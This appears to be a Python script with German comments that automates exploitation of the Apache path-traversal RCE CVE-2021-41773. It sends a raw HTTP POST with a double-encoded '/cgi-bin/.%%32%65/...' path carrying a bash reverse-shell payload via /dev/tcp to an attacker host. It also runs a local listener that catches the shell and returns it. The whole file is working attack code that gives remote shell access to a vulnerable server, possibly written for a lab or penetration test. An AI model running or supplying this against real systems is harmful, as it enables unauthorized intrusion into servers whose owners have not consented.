import socket
import threading
import time
from urllib.parse import urlparse


def fire_exploit(target_url, lhost, lport):
    """Sendet den Apache RCE-Exploit via raw TCP socket.
    Wir bauen die HTTP-Anfrage manuell, weil sowohl `requests` als auch
    `urllib3` die `%`-Zeichen im Pfad neu kodieren (`%32%65` → `%2532%2565`),
    was die Path-Traversal von CVE-2021-41773 zerstört. Raw socket = keine
    Normalisierung.
    """
    time.sleep(1)  # Listener Zeit zum Aufgehen geben

    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port or 80

    payload = (
        f"echo Content-Type: text/plain; echo; "
        f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
    )
    path = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"

    request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(payload)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{payload}"
    )

    print(f"[*] Sende Exploit an {host}:{port}{path}")

    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)  # Reverse Shell hängt den Request, kurzer Timeout reicht
        s.connect((host, port))
        s.sendall(request.encode())
    except (socket.timeout, ConnectionResetError):
        pass  # Erwartet, sobald die Reverse Shell die Verbindung übernimmt
    except Exception as e:
        print(f"[-] Fehler beim Senden des Exploits: {e}")
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def get_www_shell(target_ip, kali_ip, kali_port=4444):
    """
    Startet den Listener, sendet den Exploit und fängt die Shell.
    Gibt das Socket-Objekt (die Reverse Shell) zurück.
    """
    target_url = f"http://{target_ip}"
    
    # 1. Socket-Listener vorbereiten
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", kali_port))
    server.listen(1)
    print(f"[*] Initial Access Listener gestartet auf Port {kali_port}...")

    # 2. Exploit im Hintergrund senden 
    threading.Thread(target=fire_exploit, args=(target_url, kali_ip, kali_port)).start()

    # 3. Auf den Rückruf vom Apache warten (Blockierend)
    server.settimeout(15) # 15 Sekunden auf Erfolg warten
    try:
        www_shell, addr = server.accept()
        print(f"[+] Initial Access erfolgreich. Shell erhalten von {addr[0]}")
        return www_shell
    except socket.timeout:
        print("[-] Timeout - Keine Shell vom Apache erhalten.")
        return None
    finally:
        server.close() # Den Listener-Port wieder freigeben
